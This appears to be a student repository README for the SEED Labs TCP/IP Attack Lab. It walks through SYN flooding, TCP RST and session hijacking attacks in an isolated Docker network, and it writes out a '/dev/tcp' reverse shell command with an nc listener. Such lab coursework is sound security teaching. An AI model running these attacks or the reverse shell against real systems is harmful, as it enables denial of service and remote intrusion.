# NetSec – SEED Labs TCP/IP Attack Lab

Implementation of the SEED Labs TCP/IP Attack Lab tasks using Python (Scapy) and C.

## Lab Environment

| Host      | IP Address  | Role             |
|-----------|-------------|------------------|
| Attacker  | 10.9.0.1    | Attack machine   |
| Host A    | 10.9.0.5    | Telnet server    |
| Host B    | 10.9.0.6    | Telnet client    |
| Host C    | 10.9.0.7    | Additional host  |

All machines share the `10.9.0.0/24` network.  The attacker container
must run in **host mode** so it can sniff traffic on the bridge interface.

### Quick Start

```bash
# Download lab setup
wget https://seedsecuritylabs.org/Labs_20.04/Files/TCP_Attacks/Labsetup.zip
unzip Labsetup.zip && cd Labsetup

# Build and start containers
docker-compose build
docker-compose up -d

# Shell into attacker container
docksh <attacker-id>
```

---

## Task 1 – SYN Flooding Attack

**Directory:** `task1/`

A SYN flood attack fills the victim's half-open connection queue by
sending large numbers of spoofed TCP SYN packets, preventing legitimate
connections from completing the three-way handshake.

### 1.1 Python Attack

```bash
# Inside the attacker container
python3 task1/synflood.py
```

Run multiple instances in parallel to improve success rate.

### 1.2 C Attack (faster)

```bash
gcc -o synflood task1/synflood.c
./synflood 10.9.0.5 23
```

### 1.3 SYN Cookie Countermeasure

```bash
# Enable on victim server
sysctl -w net.ipv4.tcp_syncookies=1
```

---

## Task 2 – TCP RST Attack on Telnet

**Directory:** `task2/`

A TCP RST attack terminates an established connection by sending a
spoofed RST packet with the correct sequence number.

### Manual

1. Open Wireshark and capture telnet traffic.
2. Edit the variables at the top of `task2/rst_attack.py` with the
   values observed in Wireshark.
3. Run:

```bash
python3 task2/rst_attack.py
```

### Automatic (sniff-and-spoof)

Set `IFACE` to the correct bridge interface name, then:

```bash
python3 task2/rst_attack_auto.py
```

---

## Task 3 – TCP Session Hijacking

**Directory:** `task3/`

TCP session hijacking injects malicious data into an existing TCP
connection by spoofing a packet with the correct sequence and
acknowledgement numbers.

### Manual

1. Capture telnet traffic in Wireshark.
2. Fill in the variables at the top of `task3/session_hijack.py`.
3. Run:

```bash
python3 task3/session_hijack.py
```

### Automatic

```bash
python3 task3/session_hijack_auto.py
```

---

## Task 4 – Reverse Shell via TCP Session Hijacking

**Directory:** `task4/`

Instead of running a single command, the attacker injects a
**reverse-shell** command into the hijacked telnet session.  When the
server executes it, it opens a TCP connection back to the attacker's
machine, providing an interactive shell.

### Reverse Shell Command (for reference)

```bash
/bin/bash -i > /dev/tcp/10.9.0.1/9090 0<&1 2>&1
```

| Part | Meaning |
|------|---------|
| `/bin/bash -i` | Interactive bash shell |
| `> /dev/tcp/10.9.0.1/9090` | Redirect stdout to attacker TCP port |
| `0<&1` | Redirect stdin from the same TCP connection |
| `2>&1` | Redirect stderr to the same TCP connection |

### Step-by-Step

**Step 1 – Start a listener on the attacker machine (10.9.0.1):**

```bash
nc -lnv 9090
```

**Step 2 – Ensure an active telnet session exists** between client
(10.9.0.6) and server (10.9.0.5).

**Step 3 – Inject the reverse-shell payload:**

*Manual (fill in Wireshark values first):*

```bash
python3 task4/reverse_shell_hijack.py
```

*Automatic (sniff-and-inject):*

```bash
# Set IFACE to your bridge interface name first
python3 task4/reverse_shell_hijack_auto.py
```

**Step 4 – Use the reverse shell.**

The `nc -lnv 9090` window on 10.9.0.1 will show a connection and a
shell prompt.  That shell is running **on the victim server (10.9.0.5)**.

### Context from Previous Tasks

Yes, Task 4 builds directly on Task 3 (TCP Session Hijacking).  The
difference is only the *payload* injected into the hijacked session:

| Task | Payload injected |
|------|-----------------|
| Task 3 | Arbitrary single command (e.g. `touch /tmp/hijacked`) |
| Task 4 | Reverse-shell command (`/bin/bash -i > /dev/tcp/...`) |

All other mechanics (packet spoofing, seq/ack values, etc.) are
identical.  The automatic script (`reverse_shell_hijack_auto.py`)
combines the sniff-and-spoof technique from Task 3 with the reverse-
shell payload from Task 4 to automate the entire attack.

---

## Requirements

```
scapy
```

Install with:

```bash
pip install scapy
```

The C program (`task1/synflood.c`) requires only a standard C compiler:

```bash
gcc -o synflood task1/synflood.c
```